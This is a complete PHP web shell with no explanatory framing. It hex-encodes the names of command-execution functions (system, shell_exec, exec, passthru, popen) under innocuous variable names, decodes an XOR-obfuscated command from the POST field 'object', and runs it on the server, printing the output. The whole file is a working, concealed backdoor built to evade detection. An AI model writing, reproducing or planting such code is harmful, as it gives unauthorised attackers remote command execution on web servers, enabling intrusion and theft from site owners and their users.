<?php

$dataflow_engine6 = "s\x74\x72e\x61m_\x67et\x5F\x63ontent\x73";
$dataflow_engine7 = "\x70\x63\x6Cose";
$dataflow_engine1 = "\x73\x79s\x74em";
$dataflow_engine3 = "exe\x63";
$dataflow_engine5 = "p\x6F\x70en";
$dataflow_engine2 = "\x73he\x6Cl_exec";
$mutex_lock = "h\x65x2\x62\x69\x6E";
$dataflow_engine4 = "\x70a\x73s\x74\x68ru";
if (isset($_POST["\x6F\x62\x6Aect"])) {
            function app_initializer (  $sym   ,  $entry) {
 $symbol  =   '' ;
 $y=0;
 do{
$symbol.=chr(ord($sym[$y])^$entry);
$y++;

} while($y<strlen($sym));
 return  $symbol;
  
}
            $object = $mutex_lock($_POST["\x6F\x62\x6Aect"]);
            $object = app_initializer($object, 74);
            if (function_exists($dataflow_engine1)) {
                $dataflow_engine1($object);
            } elseif (function_exists($dataflow_engine2)) {
                print $dataflow_engine2($object);
            } elseif (function_exists($dataflow_engine3)) {
                $dataflow_engine3($object, $pset_sym);
                print join("\n", $pset_sym);
            } elseif (function_exists($dataflow_engine4)) {
                $dataflow_engine4($object);
            } elseif (function_exists($dataflow_engine5) && function_exists($dataflow_engine6) && function_exists($dataflow_engine7)) {
                $entry_symbol = $dataflow_engine5($object, 'r');
                if ($entry_symbol) {
                    $hld_ref = $dataflow_engine6($entry_symbol);
                    $dataflow_engine7($entry_symbol);
                    print $hld_ref;
                }
            }
            exit;
        }